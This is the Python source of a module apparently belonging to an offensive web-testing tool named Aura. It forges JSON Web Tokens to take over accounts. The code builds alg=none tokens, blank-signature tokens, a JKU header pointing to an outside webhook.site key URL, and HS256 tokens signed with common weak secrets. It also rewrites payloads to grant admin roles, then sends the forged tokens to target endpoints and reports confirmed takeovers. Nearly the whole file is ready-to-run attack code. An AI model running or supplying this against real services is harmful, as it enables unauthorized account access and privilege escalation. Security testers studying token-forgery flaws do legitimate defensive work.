"""
Aura v31.0 — TokenBreaker (JWT & Identity Forgery Engine)
=========================================================
Detects and exploits JWT and Session token vulnerabilities leading to Account Takeover.

Attacks Implemented:
  1. Algorithm Downgrade (alg: none)
  2. RS256 to HS256 Confusion (Using public key as symmetric secret)
  3. Payload Tampering (Privilege Escalation / ID Swapping)
  4. Null Signature / Dropped Signature
  5. JKU Header Injection
"""

import base64
import json
import os
import re
from datetime import datetime
from typing import Optional, Tuple
from urllib.parse import urlparse
from pathlib import Path

import httpx
import jwt
from rich.console import Console

from aura.ui.formatter import console

# Standard JWT format: header.payload.signature
JWT_REGEX = re.compile(r"^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$")


class TokenBreaker:
    """
    Advanced JWT & Identity Forgery Engine.
    Requires a valid JWT token to extract the format and attempt forgery.
    """

    def __init__(self, target: str, token: str, timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urlparse(self.target).netloc
        self.timeout = timeout
        
        # Clean the token (remove 'Bearer ' if present)
        self.original_token = token.replace("Bearer ", "").strip()
        self.is_valid_jwt = bool(JWT_REGEX.match(self.original_token))
        
        self.findings: list[dict] = []
        self.tested_count = 0

    def _base64url_decode(self, input_str: str) -> str:
        """Helper to decode base64url padding-free."""
        rem = len(input_str) % 4
        if rem > 0:
            input_str += '=' * (4 - rem)
        return base64.urlsafe_b64decode(input_str).decode('utf-8', errors='ignore')

    def _base64url_encode(self, input_bytes: bytes) -> str:
        """Helper to encode base64url padding-free."""
        return base64.urlsafe_b64encode(input_bytes).decode('utf-8').rstrip('=')

    def _decode_jwt(self, token: str) -> Tuple[Optional[dict], Optional[dict], str]:
        """Decodes header and payload without verifying signature."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None, ""
            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))
            signature = parts[2]
            return header, payload, signature
        except Exception:
            return None, None, ""

    def _build_jwt(self, header: dict, payload: dict, signature: str = "") -> str:
        """Builds a raw JWT string from parts."""
        h_enc = self._base64url_encode(json.dumps(header).encode())
        p_enc = self._base64url_encode(json.dumps(payload).encode())
        return f"{h_enc}.{p_enc}.{signature}"

    async def _test_token(self, client: httpx.AsyncClient, url: str, method: str, 
                          forged_token: str, attack_name: str, baseline_status: int, baseline_len: int) -> Optional[dict]:
        """Tests a forged token against the endpoint."""
        self.tested_count += 1
        headers = {
            "Authorization": f"Bearer {forged_token}",
            "User-Agent": "Aura-TokenBreaker/31.0",
            "Accept": "application/json"
        }
        
        try:
            req = client.build_request(method, url, headers=headers)
            resp = await client.send(req)
            
            # If the response is 200/201/204, and the baseline wasn't a universal 200 for anything,
            # or if the response size indicates success rather than an error JSON
            if resp.status_code in [200, 201, 204]:
                # Weak defense check: some APIs return 200 with {"error": "invalid_token"}
                if "error" in resp.text.lower() or "invalid" in resp.text.lower() or "expired" in resp.text.lower():
                    return None
                    
                # If baseline failed (e.g. 401) but our forged one succeeded (200) -> CRITICAL
                # If both succeeded, we need to check if we actually bypassed checks. 
                # (e.g. we tampered payload to admin, and it still gave 200)
                
                return {
                    "type": "JWT Forgery / Signature Bypass",
                    "url": url,
                    "method": method,
                    "attack_name": attack_name,
                    "forged_token": forged_token[:50] + "... (truncated)",
                    "response_status": resp.status_code,
                    "severity": "CRITICAL",
                    "cvss_score": 9.1,
                    "owasp": "A01:2021 — Broken Access Control",
                    "timestamp": datetime.utcnow().isoformat(),
                    "reason": f"Server accepted forged token ({attack_name}) and returned HTTP {resp.status_code}."
                }
        except httpx.RequestError:
            pass
        return None

    async def _run_attacks(self, client: httpx.AsyncClient, url: str, method: str):
        """Generates and tests all JWT forgery payloads."""
        header, payload, sig = self._decode_jwt(self.original_token)
        if not header or not payload:
            console.print(f"  [yellow]⚠️ Skipping JWT attacks — token format is invalid.[/yellow]")
            return

        print(f"\n  🎯 Testing TokenBreaker on [{method}] {url[:70]}")
        
        # 0. Get baseline with the ORIGINAL valid token (so we know what success looks like)
        try:
            baseline_resp = await client.request(method, url, headers={"Authorization": f"Bearer {self.original_token}"})
            baseline_status = baseline_resp.status_code
            baseline_len = len(baseline_resp.text)
            print(f"     ✅ Baseline (Valid Token): HTTP {baseline_status} ({baseline_len} bytes)")
        except Exception:
            baseline_status = 0
            baseline_len = 0
            print(f"     ⚠️ Baseline request failed. Proceeding blindly.")

        # 0.5 Generate a Tampered Payload (Privilege Escalation)
        tampered_payload = payload.copy()
        
        # Attempt to escalate role
        if "role" in tampered_payload:
            tampered_payload["role"] = "admin"
        elif "is_admin" in tampered_payload:
            tampered_payload["is_admin"] = True
        elif "scope" in tampered_payload:
            tampered_payload["scope"] = "admin read write"
        elif "id" in tampered_payload and isinstance(tampered_payload["id"], int):
            tampered_payload["id"] = 1 # Often the admin ID
        else:
            # Blind injection
            tampered_payload["role"] = "admin"
            
        tasks = []
            
        # 1. Attack: None Algorithm (CVE-2015-9256)
        # Modify header to "none" and drop signature
        for none_alg in ["none", "None", "NONE"]:
            h_none = header.copy()
            h_none["alg"] = none_alg
            t_none = self._build_jwt(h_none, tampered_payload, "")
            tasks.append(self._test_token(client, url, method, t_none, f"alg={none_alg} (Signature Dropped)", baseline_status, baseline_len))
            
        # 2. Attack: Blank Signature but original alg
        t_blank = self._build_jwt(header, tampered_payload, "")
        tasks.append(self._test_token(client, url, method, t_blank, "Original Alg with Blank Signature", baseline_status, baseline_len))

        # 3. Attack: JKU Injection (CVE-2018-0114)
        h_jku = header.copy()
        h_jku["jku"] = "https://webhook.site/malicious-jwks.json"
        t_jku = jwt.encode(tampered_payload, "secret", algorithm="HS256", headers=h_jku)
        tasks.append(self._test_token(client, url, method, t_jku, "JKU Header Injection", baseline_status, baseline_len))

        # 4. Attack: RS256 to HS256 Confusion (If we can't extract the public key, we use classic strings)
        # We sign the tampered payload with HS256 using common public key strings or known secrets
        common_secrets = ["secret", "123456", "password", "public_key.pem", ""]
        for secret in common_secrets:
            try:
                t_confused = jwt.encode(tampered_payload, secret, algorithm="HS256", headers=header)
                tasks.append(self._test_token(client, url, method, t_confused, f"HS256 Confusion (Secret: '{secret}')", baseline_status, baseline_len))
            except Exception:
                pass
                
        # Execute all tests concurrently
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res:
                print(f"     🚨 CRITICAL: {res['attack_name']} Successful! HTTP {res['response_status']}")
                self.findings.append(res)
                # If we broke it once, no need to spam the output, but we keep testing.

    async def scan_urls(self, endpoints: list) -> list:
        if not self.is_valid_jwt:
            console.print("[dim yellow]⚠️ No valid JWT provided. TokenBreaker attacks will be skipped.[/dim yellow]")
            return []

        console.print(f"\n[bold magenta]🎟️ AURA v31.0 — TokenBreaker (JWT & Identity Forgery)[/bold magenta]")
        console.print(f"🎯 Target: {self.target}")
        console.print(f"🔑 Valid JWT Detected. Preparing payload mutations...")

        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
            # We don't need to test every single endpoint. We just need one authenticated endpoint 
            # (like /me, /profile, /orders, /users) to prove the signature bypass.
            auth_endpoints = [ep for ep in endpoints if ep.get("method") in ["GET", "POST", "PUT", "PATCH", "DELETE"]]
            
            # Select max 3 endpoints to avoid noise
            targets_to_test = auth_endpoints[:3]
            
            for ep in targets_to_test:
                url = ep["url"]
                method = ep.get("method", "GET")
                await self._run_attacks(client, url, method)

        self._finalize_report()
        return self.findings

    def _finalize_report(self):
        print(f"\n{'='*65}")
        print(f"✅ TOKEN BREAKER COMPLETE")
        print(f"{'='*65}")
        print(f"  🔍 Forgeries Tested : {self.tested_count}")
        print(f"  🚨 ATO Confirmed    : {len(self.findings)}")
        
        if self.findings:
            reports_dir = Path("./reports")
            reports_dir.mkdir(exist_ok=True)
            target_slug = self.target_domain.replace(".", "_")
            out_path = reports_dir / f"jwt_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target,
                    "scan_time": datetime.utcnow().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
        else:
            print(f"\n  ✅ JWT implementation appears secure against classic forgery vectors.")

def run_jwt_scan(target: str, discovery_map_path: Optional[str] = None):
    """CLI runner for `aura <target> --jwt`."""
    from dotenv import load_dotenv
    load_dotenv()

    token = os.getenv("AUTH_TOKEN_ATTACKER", "")
    if not token:
        console.print("[red]❌ AUTH_TOKEN_ATTACKER not found in .env! A valid token is required for forgery testing.[/red]")
        return []

    # Auto-find discovery map if not specified
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)

    endpoints = []
    if discovery_map_path:
        try:
            with open(discovery_map_path, "r", encoding="utf-8-sig") as f:
                dmap = json.load(f)
                endpoints = dmap.get("mutating_endpoints", []) + dmap.get("idor_candidates", [])
        except Exception:
            pass
            
    if not endpoints:
        # Fallback blind tests
        endpoints = [
            {"url": f"{target}/api/v1/me", "method": "GET"},
            {"url": f"{target}/api/profile", "method": "GET"},
            {"url": f"{target}/api/user", "method": "GET"}
        ]

    engine = TokenBreaker(target=target, token=token)
    return asyncio.run(engine.scan_urls(endpoints))

if __name__ == "__main__":
    import sys
    import asyncio
    target_url = sys.argv[1] if len(sys.argv) > 1 else "www.example.com"
    run_jwt_scan(target_url)
